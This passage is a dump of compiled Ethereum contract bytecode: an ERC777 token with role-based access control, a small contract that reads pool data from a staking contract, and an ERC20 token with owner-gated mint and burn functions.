182b576040805162461bcd60e51b8152602060048201526011602482015270416d6f756e7420697320746f6f2062696760781b604482015290519081900360640190fd5b6118a0888888888080601f01602080910402602001604051908101604052809392919081815260200183838082843760009201919091525050604080516020601f8c018190048102820181019092528a815292508a91508990819084018382808284376000920191909152506123f092505050565b506001979650505050505050565b6001600160a01b03918216600090815260086020908152604080832093909416825291909152205490565b6b169e43a85eb381aa5800000081565b6040518060400160405280600381526020016214d2d360ea1b81525081565b60a05460408051633581777360e01b8152602060048201819052600a602483015269546f6b656e537461746560b01b604483015291516000936001600160a01b03169263358177739260648082019391829003018186803b1580156113f957600080fd5b611974611c3f565b6001600160a01b0316816001600160a01b031614156119c45760405162461bcd60e51b81526004018080602001828103825260218152602001806131c86021913960400191505060405180910390fd5b6001600160a01b03811660009081526005602052604090205460ff1615611a30576001600760006119f3611c3f565b6001600160a01b03908116825260208083019390935260409182016000908120918616815292529020805460ff1916911515919091179055611a6e565b60066000611a3c611c3f565b6001600160a01b03908116825260208083019390935260409182016000908120918516815292529020805460ff191690555b611a76611c3f565b6001600160a01b0316816001600160a01b03167f50546e66e5f44d728365dc3908c63bc5cfeeab470722c1677e3073a6ac294aa160405160405180910390a350565b611ac9611ac3611c3f565b856115ae565b611b045760405162461bcd60e51b815260040180806020018281038252602c8152602001806132aa602c913960400191505060405180910390fd5b611b1084848484612634565b50505050565b610f92611b21611c3f565b838360405180602001604052806000815250612634565b600954610100900460ff1680611b515750611b516122c7565b80611b5f575060095460ff16155b611b9a5760405162461bcd60e51b815260040180806020018281038252602e815260200180613236602e913960400191505060405180910390fd5b600954610100900460ff16158015611bc5576009805460ff1961ff0019909116610100171660011790555b611bcd61287a565b611bd561287a565b8015611be7576009805461ff00191690555b50565b6000813f7fc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470818114801590611c1e57508115155b949350505050565b600061109c836001600160a01b03841661291a565b3390565b6000611c49611c3b565b905090565b6001600160a01b038316611c935760405162461bcd60e51b81526004018080602001828103825260258152602001806130bb6025913960400191505060405180910390fd5b6001600160a01b038216611cd85760405162461bcd60e51b81526004018080602001828103825260238152602001806133486023913960400191505060405180910390fd5b6001600160a01b03808416600081815260086020908152604080832094871680845294825291829020859055815185815291517f8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b9259281900390910190a3505050565b600260a1541415611d92576040805162461bcd60e51b815260206004820152601f60248201527f5265656e7472616e637947756172643a207265656e7472616e742063616c6c00604482015290519081900360640190fd5b600260a155611da5868686868686612964565b5050600160a15550505050565b611dbe86868686612bab565b611e0183604051806060016040528060278152602001613102602791396001600160a01b038816600090815260208190526040902054919063ffffffff611fd716565b6001600160a01b038087166000908152602081905260408082209390935590861681522054611e36908463ffffffff612c1416565b600080866001600160a01b03166001600160a01b0316815260200190815260200160002081905550836001600160a01b0316856001600160a01b0316876001600160a01b03167f06b541ddaa720db2b10a4d0cdac39b8d360425fc073085fac19bc82614677987868686604051808481526020018060200180602001838103835285818151815260200191508051906020019080838360005b83811015611ee7578181015183820152602001611ecf565b50505050905090810190601f168015611f145780820380516001836020036101000a031916815260200191505b50838103825284518152845160209182019186019080838360005b83811015611f47578181015183820152602001611f2f565b50505050905090810190601f168015611f745780820380516001836020036101000a031916815260200191505b509550505050505060405180910390a4836001600160a01b0316856001600160a01b03167fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef856040518082815260200191505060405180910390a3505050505050565b600081848411156120665760405162461bcd60e51b81526004018080602001828103825283818151815260200191508051906020019080838360005b8381101561202b578181015183820152602001612013565b50505050905090810190601f1680156120585780820380516001836020036101000a031916815260200191505b509250505060405180910390fd5b505050900390565b600260a15414156120c6576040805162461bcd60e51b815260206004820152601f60248201527f5265656e7472616e637947756172643a207265656e7472616e742063616c6c00604482015290519081900360640190fd5b600260a1556120da87878787878787612c6e565b5050600160a1555050505050565b6000828152606e60205260409020612106908263ffffffff611c2616565b15610f9257612113611c3f565b6001600160a01b0316816001600160a01b0316837f2f8788117e7eff1d82e926ec794901d17c78024a50270940304540a733656f0d60405160405180910390a45050565b6000828152606e60205260409020612175908263ffffffff612f0e16565b15610f9257612182611c3f565b6001600160a01b0316816001600160a01b0316837ff6391f5c32d9c69d2a47ea670b442974b53935d1edc7fd64eb21e047a839171b60405160405180910390a45050565b6001600160a01b03861661220b5760405162461bcd60e51b81526004018080602001828103825260228152602001806130e06022913960400191505060405180910390fd5b6001600160a01b038516612266576040805162461bcd60e51b815260206004820181905260248201527f4552433737373a2073656e6420746f20746865207a65726f2061646472657373604482015290519081900360640190fd5b6000612270611c3f565b9050612280818888888888611d3a565b61228e818888888888611db2565b61229d8188888888888861206e565b50505050505050565b600061109c8383612f23565b600061109c836001600160a01b038416612f87565b303b1590565b6001600160a01b0381166123125760405162461bcd60e51b81526004018080602001828103825260228152602001806132646022913960400191505060405180910390fd5b612324816001600160a01b0316611bea565b612375576040805162461bcd60e51b815260206004820152601760248201527f41646472657373206973206e6f7420636f6e7472616374000000000000000000604482015290519081900360640190fd5b60a080546001600160a01b0319166001600160a01b0392909216919091179055565b6000610c6982612f9f565b6000611c4981336110a3565b600061109c83836040518060400160405280601e81526020017f536166654d6174683a207375627472616374696f6e206f766572666c6f770000815250611fd7565b6001600160a01b03841661244b576040805162461bcd60e51b815260206004820181905260248201527f4552433737373a206d696e7420746f20746865207a65726f2061646472657373604482015290519081900360640190fd5b6000612455611c3f565b90506124648160008787612bab565b600154612477908563ffffffff612c1416565b6001556001600160a01b0385166000908152602081905260409020546124a3908563ffffffff612c1416565b6001600160a01b0386166000908152602081905260408120919091556124d090829087878787600161206e565b846001600160a01b0316816001600160a01b03167f2fe5be0146f74c5bce36c0b80911af6c7d86ff27e89d5cfa61fc681327954e5d868686604051808481526020018060200180602001838103835285818151815260200191508051906020019080838360005b8381101561254f578181015183820152602001612537565b50505050905090810190601f16801561257c5780820380516001836020036101000a031916815260200191505b50838103825284518152845160209182019186019080838360005b838110156125af578181015183820152602001612597565b50505050905090810190601f1680156125dc5780820380516001836020036101000a031916815260200191505b509550505050505060405180910390a36040805185815290516001600160a01b038716916000917fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef9181900360200190a35050505050565b6001600160a01b0384166126795760405162461bcd60e51b81526004018080602001828103825260228152602001806131526022913960400191505060405180910390fd5b6000612683611c3f565b905061269481866000878787611d3a565b6126a18186600087612bab565b6126e484604051806060016040528060238152602001613325602391396001600160a01b038816600090815260208190526040902054919063ffffffff611fd716565b6001600160a01b038616600090815260208190526040902055600154612710908563ffffffff6123ae16565b600181905550846001600160a01b0316816001600160a01b03167fa78a9be3a7b862d26933ad85fb11d80ef66b8f972d7cbba06621d583943a4098868686604051808481526020018060200180602001838103835285818151815260200191508051906020019080838360005b8381101561279557818101518382015260200161277d565b50505050905090810190601f1680156127c25780820380516001836020036101000a031916815260200191505b50838103825284518152845160209182019186019080838360005b838110156127f55781810151838201526020016127dd565b50505050905090810190601f1680156128225780820380516001836020036101000a031916815260200191505b509550505050505060405180910390a36040805185815290516000916001600160a01b038816917fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef9181900360200190a35050505050565b600954610100900460ff168061289357506128936122c7565b806128a1575060095460ff16155b6128dc5760405162461bcd60e51b815260040180806020018281038252602e815260200180613236602e913960400191505060405180910390fd5b600954610100900460ff16158015611bd5576009805460ff1961ff0019909116610100171660011790558015611be7576009805461ff001916905550565b60006129268383612f87565b61295c57508154600181810184556000848152602080822090930184905584548482528286019093526040902091909155610c69565b506000610c69565b6040805163555ddc6560e11b81526001600160a01b03871660048201527f29ddb589b1fb5fc7cf394961c1adf5f8c6454761adf795e67fe149f658abe89560248201529051600091731820a4b7618bde71dce8cdc73aab6c95905fad249163aabbb8ca91604480820192602092909190829003018186803b1580156129e857600080fd5b505afa1580156129fc573d6000803e3d6000fd5b505050506040513d6020811015612a1257600080fd5b505190506001600160a01b0381161561229d57806001600160a01b03166375ab97828888888888886040518763ffffffff1660e01b815260040180876001600160a01b03166001600160a01b03168152602001866001600160a01b03166001600160a01b03168152602001856001600160a01b03166001600160a01b031681526020018481526020018060200180602001838103835285818151815260200191508051906020019080838360005b83811015612ad8578181015183820152602001612ac0565b50505050905090810190601f168015612b055780820380516001836020036101000a031916815260200191505b50838103825284518152845160209182019186019080838360005b83811015612b38578181015183820152602001612b20565b50505050905090810190601f168015612b655780820380516001836020036101000a031916815260200191505b5098505050505050505050600060405180830381600087803b158015612b8a57600080fd5b505af1158015612b9e573d6000803e3d6000fd5b5050505050505050505050565b6000612bb684611908565b9050801561105c57612bce818363ffffffff612c1416565b612bd785611063565b101561105c5760405162461bcd60e51b81526004018080602001828103825260298152602001806131296029913960400191505060405180910390fd5b60008282018381101561109c576040805162461bcd60e51b815260206004820152601b60248201527f536166654d6174683a206164646974696f6e206f766572666c6f770000000000604482015290519081900360640190fd5b6040805163555ddc6560e11b81526001600160a01b03871660048201527fb281fc8c12954d22544db45de3159a39272895b169a852b314f9cc762e44c53b60248201529051600091731820a4b7618bde71dce8cdc73aab6c95905fad249163aabbb8ca91604480820192602092909190829003018186803b158015612cf257600080fd5b505afa158015612d06573d6000803e3d6000fd5b505050506040513d6020811015612d1c57600080fd5b505190506001600160a01b03811615612eb057806001600160a01b03166223de298989898989896040518763ffffffff1660e01b815260040180876001600160a01b03166001600160a01b03168152602001866001600160a01b03166001600160a01b03168152602001856001600160a01b03166001600160a01b031681526020018481526020018060200180602001838103835285818151815260200191508051906020019080838360005b83811015612de1578181015183820152602001612dc9565b50505050905090810190601f168015612e0e5780820380516001836020036101000a031916815260200191505b50838103825284518152845160209182019186019080838360005b83811015612e41578181015183820152602001612e29565b50505050905090810190601f168015612e6e5780820380516001836020036101000a031916815260200191505b5098505050505050505050600060405180830381600087803b158015612e9357600080fd5b505af1158015612ea7573d6000803e3d6000fd5b50505050612f04565b8115612f0457612ec8866001600160a01b0316611bea565b15612f045760405162461bcd60e51b815260040180806020018281038252604d8152602001806131e9604d913960600191505060405180910390fd5b5050505050505050565b600061109c836001600160a01b038416612fa3565b81546000908210612f655760405162461bcd60e51b815260040180806020018281038252602281526020018061306a6022913960400191505060405180910390fd5b826000018281548110612f7457fe5b9060005260206000200154905092915050565b60009081526001919091016020526040902054151590565b5490565b6000818152600183016020526040812054801561305f5783546000198083019190810190600090879083908110612fd657fe5b9060005260206000200154905080876000018481548110612ff357fe5b60009182526020808320909101929092558281526001898101909252604090209084019055865487908061302357fe5b60019003818190600052602060002001600090559055866001016000878152602001908152602001600020600090556001945050505050610c69565b6000915050610c6956fe456e756d657261626c655365743a20696e646578206f7574206f6620626f756e6473416363657373436f6e74726f6c3a2073656e646572206d75737420626520616e2061646d696e20746f206772616e744552433737373a20617070726f76652066726f6d20746865207a65726f20616464726573734552433737373a2073656e642066726f6d20746865207a65726f20616464726573734552433737373a207472616e7366657220616d6f756e7420657863656564732062616c616e6365546f6b656e2073686f756c6420626520756e6c6f636b656420666f72207472616e7366657272696e674552433737373a206275726e2066726f6d20746865207a65726f20616464726573734552433737373a20617574686f72697a696e672073656c66206173206f70657261746f72416363657373436f6e74726f6c3a2073656e646572206d75737420626520616e2061646d696e20746f207265766f6b654552433737373a207265766f6b696e672073656c66206173206f70657261746f724552433737373a20746f6b656e20726563697069656e7420636f6e747261637420686173206e6f20696d706c656d656e74657220666f7220455243373737546f6b656e73526563697069656e74436f6e747261637420696e7374616e63652068617320616c7265616479206265656e20696e697469616c697a6564436f6e74726163744d616e616765722061646472657373206973206e6f74207365744552433737373a207472616e7366657220746f20746865207a65726f20616464726573734552433737373a2063616c6c6572206973206e6f7420616e206f70657261746f7220666f7220686f6c6465724552433737373a207472616e7366657220616d6f756e74206578636565647320616c6c6f77616e63654552433737373a207472616e736665722066726f6d20746865207a65726f20616464726573734552433737373a206275726e20616d6f756e7420657863656564732062616c616e63654552433737373a20617070726f766520746f20746865207a65726f2061646472657373416363657373436f6e74726f6c3a2063616e206f6e6c792072656e6f756e636520726f6c657320666f722073656c66a26469706673582212207e5f1c2c6a420293c676e424c82885d0e98e0a21cd8c324df31173071dba01eb64736f6c634300060a0033', '0x608060405234801561001057600080fd5b50600436106100415760003560e01c806330fa738c14610046578063d4fac45d14610064578063f72c079114610084575b600080fd5b61004e61008c565b60405161005b9190610573565b60405180910390f35b61007761007236600461049e565b6100c5565b60405161005b91906105e4565b61004e61040d565b6040518060400160405280600581526020017f455243323000000000000000000000000000000000000000000000000000000081525081565b600080731daed74ed1dd7c9dabbe51361ac90a69d851234d73ffffffffffffffffffffffffffffffffffffffff1663081e3eda6040518163ffffffff1660e01b815260040160206040518083038186803b15801561012257600080fd5b505afa158015610136573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019061015a919061055b565b905073ffffffffffffffffffffffffffffffffffffffff841673c28e27870558cf22add83540d2126da2e4b464c21415610252576000805b82811015610248576040517fb3594f87000000000000000000000000000000000000000000000000000000008152731daed74ed1dd7c9dabbe51361ac90a69d851234d9063b3594f87906101ec90849089906004016105ed565b60206040518083038186803b15801561020457600080fd5b505afa158015610218573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019061023c919061055b565b90910190600101610192565b5091506104079050565b60005b8181101561040057610265610446565b6040517f93f1a40b000000000000000000000000000000000000000000000000000000008152731daed74ed1dd7c9dabbe51361ac90a69d851234d906393f1a40b906102b790859089906004016105ed565b604080518083038186803b1580156102ce57600080fd5b505afa1580156102e2573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906103069190610528565b9050610310610460565b6040517f1526fe27000000000000000000000000000000000000000000000000000000008152731daed74ed1dd7c9dabbe51361ac90a69d851234d90631526fe27906103609086906004016105e4565b60806040518083038186803b15801561037857600080fd5b505afa15801561038c573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906103b091906104d6565b90508673ffffffffffffffffffffffffffffffffffffffff16816000015173ffffffffffffffffffffffffffffffffffffffff1614156103f65750519250610407915050565b5050600101610255565b5060009150505b92915050565b6040518060400160405280600581526020017f417373657400000000000000000000000000000000000000000000000000000081525081565b604051806040016040528060008152602001600081525090565b6040518060800160405280600073ffffffffffffffffffffffffffffffffffffffff1681526020016000815260200160008152602001600081525090565b600080604083850312156104b0578182fd5b82356104bb81610638565b915060208301356104cb81610638565b809150509250929050565b6000608082840312156104e7578081fd5b6104f16080610611565b82516104fc81610638565b808252506020830151602082015260408301516040820152606083015160608201528091505092915050565b600060408284031215610539578081fd5b6105436040610611565b82518152602083015160208201528091505092915050565b60006020828403121561056c578081fd5b5051919050565b6000602080835283518082850152825b8181101561059f57858101830151858201604001528201610583565b818111156105b05783604083870101525b50601f017fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffe016929092016040019392505050565b90815260200190565b91825273ffffffffffffffffffffffffffffffffffffffff16602082015260400190565b60405181810167ffffffffffffffff8111828210171561063057600080fd5b604052919050565b73ffffffffffffffffffffffffffffffffffffffff8116811461065a57600080fd5b5056fea2646970667358221220d55b183e77069e285e1d2241452c7cd9d19c7bfb8446eb239898f40343ef734f64736f6c63430006050033', '0x608060405234801561001057600080fd5b50600436106101a95760003560e01c806370a08231116100f9578063a9059cbb11610097578063d547741f11610071578063d547741f14610974578063dd62ed3e146109c2578063e58378bb14610a3a578063e87398ba14610a58576101a9565b8063a9059cbb1461087e578063b9bc87f5146108e4578063ca15c87314610932576101a9565b806395d89b41116100d357806395d89b41146107295780639dc29fac146107ac578063a217fddf146107fa578063a457c2d714610818576101a9565b806370a08231146105f35780639010d07c1461064b57806391d14854146106c3576101a9565b80632f2ff15d11610166578063395093511161014057806339509351146104a35780633e91a6141461050957806340c10f19146105575780636f31bdfa146105a5576101a9565b80632f2ff15d146103e3578063313ce5671461043157806336568abe14610455576101a9565b8063044ee51f146101ae57806306fdde0314610214578063095ea7b31461029757806318160ddd146102fd57806323b872dd1461031b578063248a9ca3146103a1575b600080fd5b6101fa600480360360408110156101c457600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff16906020019092919080359060200190929190505050610aa6565b604051808215151515815260200191505060405180910390f35b61021c610b75565b6040518080602001828103825283818151815260200191508051906020019080838360005b8381101561025c578082015181840152602081019050610241565b50505050905090810190601f1680156102895780820380516001836020036101000a031916815260200191505b509250505060405180910390f35b6102e3600480360360408110156102ad57600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff16906020019092919080359060200190929190505050610c17565b604051808215151515815260200191505060405180910390f35b610305610c35565b6040518082815260200191505060405180910390f35b6103876004803603606081101561033157600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190803573ffffffffffffffffffffffffffffffffffffffff16906020019092919080359060200190929190505050610c3f565b604051808215151515815260200191505060405180910390f35b6103cd600480360360208110156103b757600080fd5b8101908080359060200190929190505050610d18565b6040518082815260200191505060405180910390f35b61042f600480360360408110156103f957600080fd5b8101908080359060200190929190803573ffffffffffffffffffffffffffffffffffffffff169060200190929190505050610d38565b005b610439610dc2565b604051808260ff1660ff16815260200191505060405180910390f35b6104a16004803603604081101561046b57600080fd5b8101908080359060200190929190803573ffffffffffffffffffffffffffffffffffffffff169060200190929190505050610dd9565b005b6104ef600480360360408110156104b957600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff16906020019092919080359060200190929190505050610e72565b604051808215151515815260200191505060405180910390f35b6105556004803603604081101561051f57600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff16906020019092919080359060200190929190505050610f25565b005b6105a36004803603604081101561056d57600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff16906020019092919080359060200190929190505050610fe4565b005b6105f1600480360360408110156105bb57600080fd5b8101908080359060200190929190803573ffffffffffffffffffffffffffffffffffffffff1690602001909291905050506110a3565b005b6106356004803603602081101561060957600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff16906020019092919050505061112e565b6040518082815260200191505060405180910390f35b6106816004803603604081101561066157600080fd5b810190808035906020019092919080359060200190929190505050611176565b604051808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b61070f600480360360408110156106d957600080fd5b8101908080359060200190929190803573ffffffffffffffffffffffffffffffffffffffff1690602001909291905050506111a8565b604051808215151515815260200191505060405180910390f35b6107316111da565b6040518080602001828103825283818151815260200191508051906020019080838360005b83811015610771578082015181840152602081019050610756565b50505050905090810190601f16801561079e5780820380516001836020036101000a031916815260200191505b509250505060405180910390f35b6107f8600480360360408110156107c257600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff1690602001909291908035906020019092919050505061127c565b005b61080261133b565b6040518082815260200191505060405180910390f35b6108646004803603604081101561082e57600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff16906020019092919080359060200190929190505050611342565b604051808215151515815260200191505060405180910390f35b6108ca6004803603604081101561089457600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff1690602001909291908035906020019092919050505061140f565b604051808215151515815260200191505060405180910390f35b610930600480360360408110156108fa57600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff1690602001909291908035906020019092919050505061142d565b005b61095e6004803603602081101561094857600080fd5b81019080803590602001909291905050506114ec565b6040518082815260200191505060405180910390f35b6109c06004803603604081101561098a57600080fd5b8101908080359060200190929190803573ffffffffffffffffffffffffffffffffffffffff169060200190929190505050611513565b005b610a24600480360360408110156109d857600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190803573ffffffffffffffffffffffffffffffffffffffff16906020019092919050505061159d565b6040518082815260200191505060405180910390f35b610a42611624565b6040518082815260200191505060405180910390f35b610aa460048036036040811015610a6e57600080fd5b8101908080359060200190929190803573ffffffffffffffffffffffffffffffffffffffff16906020019092919050505061165d565b005b6000610ae760405180807f4f574e45525f524f4c4500000000000000000000000000000000000000000000815250600a0190506040518091039020336111a8565b610b59576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004018080602001828103825260168152602001807f43616c6c6572206973206e6f7420616e206f776e65720000000000000000000081525060200191505060405180910390fd5b610b6b610b646116e8565b84846116f0565b6001905092915050565b606060038054600181600116156101000203166002900480601f016020809104026020016040519081016040528092919081815260200182805460018160011615610100020316600290048015610c0d5780601f10610be257610100808354040283529160200191610c0d565b820191906000526020600020905b815481529060010190602001808311610bf057829003601f168201915b5050505050905090565b6000610c2b610c246116e8565b84846119a3565b6001905092915050565b6000600254905090565b6000610c4c848484611b9a565b610d0d84610c586116e8565b610d0885604051806060016040528060288152602001612be960289139600160008b73ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000206000610cbe6116e8565b73ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054611e5b9092919063ffffffff16565b6119a3565b600190509392505050565b600060066000838152602001908152602001600020600201549050919050565b610d5f6006600084815260200190815260200160002060020154610d5a6116e8565b6111a8565b610db4576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040180806020018281038252602f815260200180612afa602f913960400191505060405180910390fd5b610dbe8282611f1b565b5050565b6000600560009054906101000a900460ff16905090565b610de16116e8565b73ffffffffffffffffffffffffffffffffffffffff168173ffffffffffffffffffffffffffffffffffffffff1614610e64576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040180806020018281038252602f815260200180612ca0602f913960400191505060405180910390fd5b610e6e8282611faf565b5050565b6000610f1b610e7f6116e8565b84610f168560016000610e906116e8565b73ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008973ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000205461204390919063ffffffff16565b6119a3565b6001905092915050565b610f6460405180807f4f574e45525f524f4c4500000000000000000000000000000000000000000000815250600a0190506040518091039020336111a8565b610fd6576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004018080602001828103825260168152602001807f43616c6c6572206973206e6f7420616e206f776e65720000000000000000000081525060200191505060405180910390fd5b610fe082826120cb565b5050565b61102360405180807f4f574e45525f524f4c4500000000000000000000000000000000000000000000815250600a0190506040518091039020336111a8565b611095576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004018080602001828103825260168152602001807f43616c6c6572206973206e6f7420616e206f776e65720000000000000000000081525060200191505060405180910390fd5b61109f8282612211565b5050565b6110ca60066000848152602001908152602001600020600201546110c56116e8565b6111a8565b61111f576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401808060200182810382526026815260200180612bc36026913960400191505060405180910390fd5b61112982826123d8565b505050565b60008060008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020549050919050565b60006111a0826006600086815260200190815260200160002060000161241790919063ffffffff16565b905092915050565b60006111d2826006600086815260200190815260200160002060000161243190919063ffffffff16565b905092915050565b606060048054600181600116156101000203166002900480601f0160208091040260200160405190810160405280929190818152602001828054600181600116156101000203166002900480156112725780601f1061124757610100808354040283529160200191611272565b820191906000526020600020905b81548152906001019060200180831161125557829003601f168201915b5050505050905090565b6112bb60405180807f4f574e45525f524f4c4500000000000000000000000000000000000000000000815250600a0190506040518091039020336111a8565b61132d576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004018080602001828103825260168152602001807f43616c6c6572206973206e6f7420616e206f776e65720000000000000000000081525060200191505060405180910390fd5b6113378282612461565b5050565b6000801b81565b600061140561134f6116e8565b8461140085604051806060016040528060258152602001612c7b60259139600160006113796116e8565b73ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008a73ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054611e5b9092919063ffffffff16565b6119a3565b6001905092915050565b600061142361141c6116e8565b8484611b9a565b6001905092915050565b61146c60405180807f4f574e45525f524f4c4500000000000000000000000000000000000000000000815250600a0190506040518091039020336111a8565b6114de576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004018080602001828103825260168152602001807f43616c6c6572206973206e6f7420616e206f776e65720000000000000000000081525060200191505060405180910390fd5b6114e88282612625565b5050565b600061150c600660008481526020019081526020016000206000016127a2565b9050919050565b61153a60066000848152602001908152602001600020600201546115356116e8565b6111a8565b61158f576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401808060200182810382526030815260200180612b936030913960400191505060405180910390fd5b6115998282611faf565b5050565b6000600160008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054905092915050565b60405180807f4f574e45525f524f4c4500000000000000000000000000000000000000000000815250600a019050604051809103902081565b611684600660008481526020019081526020016000206002015461167f6116e8565b6111a8565b6116d9576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401808060200182810382526026815260200180612bc36026913960400191505060405180910390fd5b6116e382826127b7565b505050565b600033905090565b600073ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff161415611793576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040180806020018281038252601d8152602001807f45524332303a202066726f6d20746865207a65726f206164647265737300000081525060200191505060405180910390fd5b600073ffffffffffffffffffffffffffffffffffffffff168273ffffffffffffffffffffffffffffffffffffffff161415611836576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040180806020018281038252601b8152602001807f45524332303a2020746f20746865207a65726f2061646472657373000000000081525060200191505060405180910390fd5b6118418383836127f6565b6118c9816040518060400160405280601e81526020017f45524332303a2020616d6f756e7420657863656564732062616c616e636500008152506000808773ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054611e5b9092919063ffffffff16565b6000808573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000208190555061195c816000808573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000205461204390919063ffffffff16565b6000808473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002081905550505050565b600073ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff161415611a29576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401808060200182810382526024815260200180612c576024913960400191505060405180910390fd5b600073ffffffffffffffffffffffffffffffffffffffff168273ffffffffffffffffffffffffffffffffffffffff161415611aaf576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401808060200182810382526022815260200180612b4b6022913960400191505060405180910390fd5b80600160008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020819055508173ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff167f8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b925836040518082815260200191505060405180910390a3505050565b600073ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff161415611c20576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401808060200182810382526025815260200180612c326025913960400191505060405180910390fd5b600073ffffffffffffffffffffffffffffffffffffffff168273ffffffffffffffffffffffffffffffffffffffff161415611ca6576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401808060200182810382526023815260200180612ad76023913960400191505060405180910390fd5b611cb18383836127f6565b611d1c81604051806060016040528060268152602001612b6d602691396000808773ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054611e5b9092919063ffffffff16565b6000808573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002081905550611daf816000808573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000205461204390919063ffffffff16565b6000808473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020819055508173ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff167fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef836040518082815260200191505060405180910390a3505050565b6000838311158290611f08576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004018080602001828103825283818151815260200191508051906020019080838360005b83811015611ecd578082015181840152602081019050611eb2565b50505050905090810190601f168015611efa5780820380516001836020036101000a031916815260200191505b509250505060405180910390fd5b5060008385039050809150509392505050565b611f4381600660008581526020019081526020016000206000016127fb90919063ffffffff16565b15611fab57611f506116e8565b73ffffffffffffffffffffffffffffffffffffffff168173ffffffffffffffffffffffffffffffffffffffff16837f2f8788117e7eff1d82e926ec794901d17c78024a50270940304540a733656f0d60405160405180910390a45b5050565b611fd7816006600085815260200190815260200160002060000161282b90919063ffffffff16565b1561203f57611fe46116e8565b73ffffffffffffffffffffffffffffffffffffffff168173ffffffffffffffffffffffffffffffffffffffff16837ff6391f5c32d9c69d2a47ea670b442974b53935d1edc7fd64eb21e047a839171b60405160405180910390a45b5050565b6000808284019050838110156120c1576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040180806020018281038252601b8152602001807f536166654d6174683a206164646974696f6e206f766572666c6f77000000000081525060200191505060405180910390fd5b8091505092915050565b600073ffffffffffffffffffffffffffffffffffffffff168273ffffffffffffffffffffffffffffffffffffffff16141561216e576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040180806020018281038252601b8152602001807f45524332303a2020746f20746